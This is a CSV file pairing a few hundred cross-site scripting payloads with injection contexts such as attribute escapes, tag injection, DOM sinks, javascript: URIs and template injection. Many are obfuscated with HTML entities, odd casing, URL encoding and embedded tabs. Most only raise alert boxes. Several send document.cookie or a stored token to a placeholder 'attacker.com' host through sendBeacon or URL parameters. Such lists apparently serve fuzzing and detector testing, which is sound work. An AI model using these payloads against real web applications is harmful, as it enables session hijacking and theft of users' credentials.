payload,context
"d&#97;t&#97;:t&#101;xt/html,<script>&#97;l&#101;rt(1)</script>",js_uri
"""><MteXt OnsTalLed=coNsoLe.Log(doCumEnt.doMaiN)>",tag_injection
&quot; ong&#101;stur&#101;&#101;nd=prompt(1) x=&quot;,attribute_escape
`><img src=x onp&#97;us&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape
"__proto__[""onpoint&#101;rc&#97;nc&#101;l""]=prompt('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)",dom_sink
' ><svG oNbeForEmaTch=coNfiRm(1)>,attribute_escape
"%3Cmarquee src=x onclose=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
<marquee src=x onpopstate=alert(%27XSS%27)>,tag_injection
%3Ctr	onanimationend=prompt('XSS')%3E,tag_injection
<a onmozfullscreenchange=alert(location.hash)>,tag_injection
"""><img src=x onk&#101;ydown=&#97;l&#101;rt('XSS')>",attribute_escape
"\"" OnaUxcLicK=aLerT(1)//",attribute_escape
' %3E%3Csvg ondrop=prompt('XSS')%3E,attribute_escape
"window[""&#101;v&#97;l""](docum&#101;nt.cooki&#101;)",dom_sink
"(n&#101;w Function(""&#101;v&#97;l(docum&#101;nt.dom&#97;in)""))();",dom_sink
"__pRotO__[""oNmoUseWheEl""]=fEtcH(dOcuMenT.cOokIe)",dom_sink
onh&#97;shch&#97;ng&#101;=&#97;l&#101;rt/**/('XSS'),event_handler
%3C% alert(1) %%3E,template_injection
"__proto__[""onlo&#97;d""]=XMLHttpR&#101;qu&#101;st(docum&#101;nt.cooki&#101;)",dom_sink
OnwAitIng=coNfiRm(DocUmeNt.DomAin),event_handler
<!--><s&#101;t onfocus=prompt(docum&#101;nt.dom&#97;in)>,tag_injection
'><Img srC=x onPoiNteRmoVe=ConFirM(dOcuMenT.dOmaIn)>,attribute_escape
onpl&#97;ying=prompt(docum&#101;nt.dom&#97;in),event_handler
'%3E%3Cimg src=x onselect=prompt(1)%3E,attribute_escape
\%22 ongotpointercapture=confirm(location.hash)//,attribute_escape
%3Cbutton	onclick=console.log(1)%3E,tag_injection
<blink onpopst&#97;t&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
<!--><body onpointermove=alert(location.hash)>,tag_injection
"""><img src=x onselect=prompt(String.fromCharCode(88,83,83))>",attribute_escape
\' ongestureend=confirm('XSS')//,attribute_escape
\' onpagereveal=\u0061lert(location.hash)//,attribute_escape
'><script>confirm(location.hash)</script>,script_injection
\' onpause=console.log('XSS')//,attribute_escape
"""%3E%3Caudio onmouseover=console.log('XSS')%3E",tag_injection
"Object.assign(window,{%22onbeforetoggle%22:fetch})",dom_sink
"\%22 onhashchange=confirm(String.fromCharCode(88,83,83))//",attribute_escape
&quot; ontoggle=alert(document.domain) x=&quot;,attribute_escape
\' onsearch=\u0061lert(1)//,attribute_escape
'><Img srC=x onWheEl=ConSolE.lOg(LocAtiOn.HasH)>,attribute_escape
&#106;AvaScrIpt:alErt(loCatIon.haSh),js_uri
"""%3E%3Ctitle onclick=confirm('XSS')%3E",tag_injection
"<baSe
OnpAgeSwaP=aLerT('XSS')>",tag_injection
%3Cform	onwebkitanimationend=prompt('XSS')%3E,tag_injection
"""><img src=x onscrollsn&#97;pch&#97;ng&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
"document.write(""%3Cimg src=x onerror=alert('XSS')%3E"")",dom_sink
"<viDeo
onCliCk=ConSolE.lOg('XSS')>",tag_injection
%27><img src=x ongotpointercapture=console.log(%27XSS%27)>,attribute_escape
<!--><ifr&#97;m&#101; oninput=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection
"location.href=%22javascript:prompt(String.fromCharCode(88,83,83))%22",dom_sink
%3Cxss/onmouseover=console.log('XSS')%3E,tag_injection
"""><img src=x onb&#101;for&#101;input=consol&#101;.log('XSS')>",attribute_escape
%3Cspan onbeforetoggle=prompt(location.hash) onbeforetoggle=prompt(location.hash)%3E,tag_injection
' ><svg ong&#101;stur&#101;&#101;nd=&#97;l&#101;rt(1)>,attribute_escape
 onBluR=cOnsOle.loG(dOcuMenT.dOmaIn),event_handler
"(n&#101;w Function(""f&#101;tch(1)""))();",dom_sink
`><img src=x ons&#101;&#97;rch=prompt(docum&#101;nt.dom&#97;in)>,attribute_escape
" onpointerover=alert(String.fromCharCode(88,83,83))",event_handler
%3Ctextarea onscrollend=alert('XSS') onscrollend=alert('XSS')%3E,tag_injection
<t&#101;mpl&#97;t&#101; src=x ons&#101;&#97;rch=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
"(n&#101;w Function(""prompt(docum&#101;nt.cooki&#101;)""))();",dom_sink
%3Cembed/onwebkitfullscreenchange=confirm(location.hash)%3E,tag_injection
`><img src=x onended=\u0061lert(1)>,attribute_escape
'><img src=x onload=console.log(1)>,attribute_escape
<form src=x onwaiting=confirm(1)>,tag_injection
"' ><svg ontr&#97;nsitionrun=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
<% prompt(1) %>,template_injection
"\%27 ontransitionrun=alert(String.fromCharCode(88,83,83))//",attribute_escape
"<script>setTimeout('prompt(document.domain)',0)</script>",script_injection
 onTraNsiTioNruN=cOnfIrm(1),event_handler
onbeforecopy=javascript:console.log('XSS'),event_handler
""" oncopy=\u0061lert(String.fromCharCode(88,83,83)) """,attribute_escape
%27 ><svg oncopy=confirm(location.hash)>,attribute_escape
eval(%22alert(document.cookie)%22),dom_sink
 onmousedown=alert(1),event_handler
' oNauXclIck=alErt(1) ',attribute_escape
	onrepeat=console.log(location.hash),event_handler
"""><Img srC=x onGesTurEenD=cOnfIrm('XSS')>",attribute_escape
location=%22javascript:console.log(%27//attacker.com/?c=%27+document.cookie)%22,dom_sink
%22><script>prompt(%27XSS%27)</script>,script_injection
"Object.assign(window,{""onselect"":\u0061lert})",dom_sink
	onMouSedOwn=coNsoLe.Log('XSS'),event_handler
<xsS	oNenD=pRomPt('XSS')>,tag_injection
"""><object onwebkitanimationend=\u0061lert(location.hash)>",tag_injection
%3Cembed onmozfullscreenchange=console.log(document.domain)%3E,tag_injection
"""><img src=x onmozfullscreenchange=alert(String.fromCharCode(88,83,83))>",attribute_escape
"\"" OntOucHmoVe=ProMpt(1)//",attribute_escape
"<img
onpageswap=console.log(1)>",tag_injection
`%3E%3Cimg src=x onbeforepaste=prompt(1)%3E,attribute_escape
javascript:void(console.log('XSS')),js_uri
'><img src=x onmousewheel=alert(location.hash)>,attribute_escape
"""><img src=x onpromptdismiss=prompt(document.domain)>",attribute_escape
' %3E%3Csvg onreset=prompt(location.hash)%3E,attribute_escape
J&#97;VasCriPt:ConFirM('XSS'),js_uri
"__proto__[""onpointerrawupdate""]=fetch(document.domain)",dom_sink
"\%22 onbeforetoggle=alert(String.fromCharCode(88,83,83))//",attribute_escape
onpageswap=console.log(location.hash),event_handler
%3Ctable x=y ontouchend=prompt(document.domain)%3E,tag_injection
%3Cnoscript/onpointerdown=prompt(document.domain)%3E,tag_injection
"__proto__[""ontouch&#101;nd""]=confirm('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)",dom_sink
'><Img srC=x onBefOreCut=coNsoLe.Log(1)>,attribute_escape
"%3Cvideo	onpaste=alert(String.fromCharCode(88,83,83))%3E",tag_injection
'><img src=x onmouseenter=\u0061lert(document.domain)>,attribute_escape
"Obj&#101;ct.&#97;ssign(window,{""ong&#101;stur&#101;st&#97;rt"":prompt})",dom_sink
"""><img src=x oncopy=console.log('XSS')>",attribute_escape
document.write(%22<img src=x onerror=alert(localStorage.getItem(%27token%27))>%22),dom_sink
JAVASCRIPT:alert(1),js_uri
\' onsecuritypolicyviolation=prompt(1)//,attribute_escape
%27 onpause=console.log(document.domain) %27,attribute_escape
"%3Cxmp onfocusout=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
`><img src=x onscrollsnapchange=alert(%27XSS%27)>,attribute_escape
"&#101;v&#97;l(""&#101;v&#97;l(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)"")",dom_sink
"__pRotO__[""oNcoPy""]=fEtcH(nAviGatOr.SenDBeAcoN('//aTtaCkeR.cOm',doCumEnt.coOkiE))",dom_sink
""" ><svg oncopy=alert(String.fromCharCode(88,83,83))>",attribute_escape
"%27><img src=x oncut=console.log(String.fromCharCode(88,83,83))>",attribute_escape
"document.body.innerHTML=""<img src=x onerror=eval(document.domain)>""",dom_sink
"Object.assign(window,{%22onbeforetoggle%22:eval})",dom_sink
"""><img src=x onb&#101;gin=confirm(loc&#97;tion.h&#97;sh)>",attribute_escape
"%22 ontransitionrun=alert(String.fromCharCode(88,83,83)) %22",attribute_escape
&quot; onb&#101;for&#101;toggl&#101;=confirm(loc&#97;tion.h&#97;sh) x=&quot;,attribute_escape
`><img src=x oncontextmenu=\u0061lert(document.domain)>,attribute_escape
"Obj&#101;ct.&#97;ssign(window,{""onk&#101;ypr&#101;ss"":consol&#101;.log})",dom_sink
onpointermove=alert(document.domain),event_handler
OnpOinTerRawUpdAte=coNsoLe.Log/***/(LocAtiOn.HasH),event_handler
"\"" OnmOusEup=coNsoLe.Log('XSS')//",attribute_escape
\' ontoggle=confirm('XSS')//,attribute_escape
""" ><svg ondragover=console.log(String.fromCharCode(88,83,83))>",attribute_escape
<s&#101;t/on&#101;nd=&#97;l&#101;rt(1)>,tag_injection
javascript:void(prompt(location.hash)),js_uri
""" oninvalid=\u0061lert(document.domain) """,attribute_escape
"<scRipT>aLerT`STriNg.FroMChArCOde(88,83,83)`</scRipT>",script_injection
""" ><svg onpromptdismiss=console.log('XSS')>",attribute_escape
<scRipT oNdbLclIck=prOmpT(1)>,tag_injection
"""><img src=x ongotpointercapture=confirm(location.hash)>",attribute_escape
<noScrIpt onBefOreMatCh=ConSolE.lOg('XSS')/>,tag_injection
"""><ObjEct onWebKitAniMatIonEnd=alErt(loCatIon.haSh)>",tag_injection
`><Img srC=x onStaLleD=pRomPt(1)>,attribute_escape
<tr	ontoggle=console.log(document.domain)>,tag_injection
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""&#97;l&#101;rt(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))""",dom_sink
' %3E%3Csvg onpointerrawupdate=prompt('XSS')%3E,attribute_escape
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=f&#101;tch(loc&#97;tion.h&#97;sh)>""",dom_sink
{{\u0061lert|constructor:1}},template_injection
%22><script ondblclick=prompt(1)>,tag_injection
""" onauxclick=console.log(1) """,attribute_escape
"Object.assign(window,{%22onpromptaction%22:fetch})",dom_sink
 onstalled=alert(document.domain),event_handler
"<form x=y onwebkitfullscreenchange=console.log(String.fromCharCode(88,83,83))>",tag_injection
<obj&#101;ct onvolum&#101;ch&#97;ng&#101;=&#97;l&#101;rt(1)/>,tag_injection
"javascript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert(location.hash) )//%0D%0A%0d%0a",js_uri
""" onpointermove=\u0061lert(document.domain) """,attribute_escape
"<auDio
onInpUt=ProMpt(loCatIon.haSh)>",tag_injection
"`><img src=x onmous&#101;&#101;nt&#101;r=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
on&#97;nim&#97;tionit&#101;r&#97;tion=confirm('XSS'),event_handler
' ><svG oNcaNplAy=ConSolE.lOg(LocAtiOn.HasH)>,attribute_escape
{{constructor.constructor(%27confirm(document.domain)%27)()}},template_injection
&quot; onr&#101;s&#101;t=&#97;l&#101;rt('XSS') x=&quot;,attribute_escape
 ontransitionstart=console.log('XSS'),event_handler
%22><img src=x onpagehide=prompt(%27XSS%27)>,attribute_escape
&quOt; onSeaRch=alErt(1) x=&quOt;,attribute_escape
javascript:confirm/***/('XSS'),js_uri
"<script>/*/prompt(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection
"'><img src=x oncopy=alert(String.fromCharCode(88,83,83))>",attribute_escape
"setTimeout(""alert(1)"",0)",dom_sink
"location=""javascr	ipt:prompt('XSS')""",dom_sink
"""><img src=x onmouseenter=\u0061lert(location.hash)>",attribute_escape
%22><img src=x onwheel=console.log(document.domain)>,attribute_escape
\%22 onpaste=console.log(document.domain)//,attribute_escape
"\"" ong&#101;stur&#101;&#101;nd=confirm('XSS')//",attribute_escape
"\"" onpointermove=prompt('XSS')//",attribute_escape
<baSe/OnpAgeSwaP=aLerT('XSS')>,tag_injection
"' %3E%3Csvg onpromptdismiss=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape
%3Ctable	oncopy=confirm('XSS')%3E,tag_injection
\%22 onpopstate=confirm(document.domain)//,attribute_escape
%3Caudio	onpopstate=confirm(location.hash)%3E,tag_injection
%22><img src=x onmousewheel=console.log(1)>,attribute_escape
ondragenter=javascr	ipt:console.log(document.domain),event_handler
<m&#101;t&#97; src=x ontr&#97;nsitionst&#97;rt=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
"s&#101;tTim&#101;out(""prompt(loc&#97;tion.h&#97;sh)"",0)",dom_sink
"Object.assign(window,{""onrepeat"":alert})",dom_sink
"'><img src=x onbeforematch=prompt(String.fromCharCode(88,83,83))>",attribute_escape
"DocUmeNt.QueRySEleCtoR(""BodY"").inNerHTML+=""coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))""",dom_sink
\%22 ongotpointercapture=console.log(document.domain)//,attribute_escape
`><img src=x ontouchmov&#101;=prompt('XSS')>,attribute_escape
<d&#101;t&#97;ils x=y onr&#101;p&#101;&#97;t=prompt(1)>,tag_injection
`><img src=x ons&#101;&#97;rch=confirm(1)>,attribute_escape
"document.write(""<img src=x onerror=prompt('//attacker.com/?c='+document.cookie)>"")",dom_sink
 onwh&#101;&#101;l=prompt(1),event_handler
"'><img src=x onmozfullscr&#101;&#101;nch&#97;ng&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
%3Cdialog onstalled=confirm('XSS')%3E,tag_injection
`><img src=x on&#101;nd&#101;d=consol&#101;.log(1)>,attribute_escape
"""><td on&#101;nd=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection
<!--><&#97;nim&#97;t&#101;motion onw&#97;iting=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
"""><video ondragstart=\u0061lert('XSS')>",tag_injection
"onb&#101;for&#101;copy=&#97;l&#101;rt&#40;String.fromCh&#97;rCod&#101;(88,83,83)&#41;",event_handler
%22 onmouseover=confirm(%27XSS%27) x=%22,attribute_escape
<dialog x=y onplay=prompt(document.domain)>,tag_injection
"__proto__[""ontr&#97;nsitionrun""]=f&#101;tch(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))",dom_sink
' ><svg ontouchst&#97;rt=confirm('XSS')>,attribute_escape
%3Cset onend=alert(1)/%3E,tag_injection
"%3Cscript
%3Eprompt(1)%3C/script%3E",script_injection
onp&#97;g&#101;r&#101;v&#101;&#97;l=confirm/*x*/(docum&#101;nt.dom&#97;in),event_handler
 onKeyPreSs=ConSolE.lOg(LocAtiOn.HasH),event_handler
"""%3E%3Cimg src=x onpromptaction=prompt(location.hash)%3E",attribute_escape
${pRomPt(1)|N},template_injection
"""><b&#97;s&#101; ontouchmov&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
eval(%22alert(1)%22),dom_sink
"__proto__[""onk&#101;ypr&#101;ss""]=XMLHttpR&#101;qu&#101;st(1)",dom_sink
`><img src=x onfullscreenchange=\u0061lert(location.hash)>,attribute_escape
"__proto__[""oninvalid""]=\u0061lert(btoa(document.cookie))",dom_sink
"__proto__[""onb&#101;for&#101;p&#97;st&#101;""]=&#101;v&#97;l(1)",dom_sink
"<body
onclose=console.log('XSS')>",tag_injection
<m&#101;t&#97; x=y ondrop=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,tag_injection
"<&#97;nim&#97;t&#101;tr&#97;nsform	ondr&#97;gov&#101;r=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
' ><svg onload=console.log(1)>,attribute_escape
"onpoint&#101;rov&#101;r=j&#97;v&#97;script:prompt(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
__proto__[%22onmouseover%22]=eval(document.cookie),dom_sink
`><Img srC=x onPasTe=ConFirM('XSS')>,attribute_escape
"<script>window['confirm'](String.fromCharCode(88,83,83))</script>",script_injection
"%22 onmouseover=confirm(String.fromCharCode(88,83,83)) x=%22",attribute_escape
<!--><form onp&#97;g&#101;hid&#101;=confirm(1)>,tag_injection
"onbeforecopy=\u0061lert(String.fromCharCode(88,83,83))",event_handler
"(neW FUncTioN(""ProMpt(1)""))();",dom_sink
<video/onmozfullscreenchange=prompt('XSS')>,tag_injection
"""><img src=x onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>",attribute_escape
<!--><&#97;udio onpl&#97;y=consol&#101;.log(1)>,tag_injection
"__proto__[""onmousedown""]=\u0061lert(1)",dom_sink
"JavA
sCriPt:ConFirM('XSS')",js_uri
'><Img srC=x onVolUmeChaNge=alErt('XSS')>,attribute_escape
""" ><svg onscrollsn&#97;pch&#97;ng&#101;=&#97;l&#101;rt('XSS')>",attribute_escape
onw&#101;bkitfullscr&#101;&#101;nch&#97;ng&#101;=prompt/***/(docum&#101;nt.dom&#97;in),event_handler
'%3E%3Cimg src=x onpointerrawupdate=prompt('XSS')%3E,attribute_escape
onpagereveal=javascript:confirm(document.domain),event_handler
"\"" OncUt=ConFirM(1)//",attribute_escape
&#106;avascr	ipt:console.log(document.domain),js_uri
"""><img src=x onclose=\u0061lert(document.domain)>",attribute_escape
""" ><svg onmous&#101;ov&#101;r=consol&#101;.log('XSS')>",attribute_escape
"Obj&#101;ct.&#97;ssign(window,{""onb&#101;gin"":XMLHttpR&#101;qu&#101;st})",dom_sink
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""prompt('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)""",dom_sink
"__proto__[""onfullscreenchange""]=console.log(localStorage.getItem('token'))",dom_sink
<!--><template onclose=console.log(1)>,tag_injection
<baSe Src=x OniNpuT=aLerT('XSS')>,tag_injection
"\' oninvalid=prompt(String.fromCharCode(88,83,83))//",attribute_escape
' ><svG oNhaShcHanGe=ConFirM(dOcuMenT.dOmaIn)>,attribute_escape
"`%3E%3Cimg src=x onpageswap=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape
"<script>prompt`String.fromCh&#97;rCod&#101;(88,83,83)`</script>",script_injection
<&#97;nim&#97;t&#101;motion/ong&#101;stur&#101;st&#97;rt=confirm(1)>,tag_injection
onpointermove=confirm/***/(%27XSS%27),event_handler
"onclick=confirm&#40;String.fromCh&#97;rCod&#101;(88,83,83)&#41;",event_handler
'><img src=x on&#101;rror=consol&#101;.log(loc&#97;tion.h&#97;sh)>,attribute_escape
"location=""javascript:XMLHttpRequest(document.domain)""",dom_sink
"""%3E%3Cimg src=x onreset=alert('XSS')%3E",attribute_escape
"""><img src=x onclos&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh)>",attribute_escape
"onclose=javascr	ipt:alert(String.fromCharCode(88,83,83))",event_handler
"location=""javascr	ipt:prompt(navigator.sendBeacon('//attacker.com',document.cookie))""",dom_sink
<anImaTemOtiOn Src=x OndBlcLicK=cOnsOle.loG(1)>,tag_injection
' ><svg onb&#101;for&#101;p&#97;st&#101;=prompt(1)>,attribute_escape
""" onreset=alert('XSS') """,attribute_escape
%27><img src=x onmousewheel=alert(1)>,attribute_escape
javascr	ipt:prompt('XSS'),js_uri
<&#97;r&#101;&#97; onclos&#101;=prompt(1)/>,tag_injection
ontransitionend=alert&#40;location.hash&#41;,event_handler
%3C%= prompt document.domain %%3E,template_injection
"__proto__[""onmous&#101;&#101;nt&#101;r""]=confirm(docum&#101;nt.cooki&#101;)",dom_sink
"${{%27confirm(1)%27.replace(%27confirm(1)%27,%27%27)}}",template_injection
<auDio	onScrOllEnd=prOmpT(lOcaTioN.hAsh)>,tag_injection
"SetIntErvAl(""coNsoLe.Log('//atTacKer.coM/?C='+doCumEnt.coOkiE)"",100)",dom_sink
onmouseenter=confirm/***/(location.hash),event_handler
<seLecT oNseCurItyPolIcyVioLatIon=coNfiRm(LocAtiOn.HasH)/>,tag_injection
"<body x=y onfocusout=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"<!--><ifr&#97;m&#101; ontouchst&#97;rt=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
onpointerover=javascr	ipt:prompt(document.domain),event_handler
' ><svG oNmoUseOveR=cOnfIrm('XSS')>,attribute_escape
<script>window['consol&#101;.log'](1)</script>,script_injection
\' OnpOinTerMovE=pRomPt(LocAtiOn.HasH)//,attribute_escape
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=pRomPt(NavIgaTor.seNdBEacOn('//AttAckEr.Com',dOcuMenT.cOokIe))>"")",dom_sink
&quot; onkeydown=alert(location.hash) x=&quot;,attribute_escape
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=cOnfIrm(naVigAtoR.sEndBeaCon('//atTacKer.coM',DocUmeNt.CooKie))>""",dom_sink
%3Cmarquee src=x onscrollsnapchange=prompt(1)%3E,tag_injection
' ><svG oNpaGesHow=prOmpT(dOcuMenT.dOmaIn)>,attribute_escape
javascript:void(alert('XSS')),js_uri
"\"" onlo&#97;d=&#97;l&#101;rt(1)//",attribute_escape
' ><svg ongesturestart=alert(1)>,attribute_escape
<foRm Src=x OnpAgeHidE=cOnfIrm(1)>,tag_injection
\' OnmOusEenTer=alErt(doCumEnt.doMaiN)//,attribute_escape
""" %3E%3Csvg onfocusin=console.log(location.hash)%3E",attribute_escape
`%3E%3Cimg src=x onauxclick=prompt(location.hash)%3E,attribute_escape
"__pRotO__[""oNtoUchMovE""]=XMLHtTpREquEst(doCumEnt.doMaiN)",dom_sink
<scRipT>/X/cOnfIrm(1)</sCriPt>,script_injection
"Object.assign(window,{""oncopy"":\u0061lert})",dom_sink
"%22 onkeydown=prompt(String.fromCharCode(88,83,83)) %22",attribute_escape
"""><table onmozfullscreenchange=confirm(1)>",tag_injection
<span onsecuritypolicyviolation=\u0061lert(location.hash) onsecuritypolicyviolation=\u0061lert(location.hash)>,tag_injection
javascript:void(prompt(document.domain)),js_uri
"""><ScrIpt>alErt(doCumEnt.doMaiN)</scRipT>",script_injection
<script>//console.log(location.hash)</script>,script_injection
"""><Img srC=x onWebKitFulLscReeNchAngE=pRomPt('XSS')>",attribute_escape
\%27 onstalled=prompt(1)//,attribute_escape
ongesturestart=console.log/**/(location.hash),event_handler
' ons&#101;&#97;rch=confirm(1) ',attribute_escape
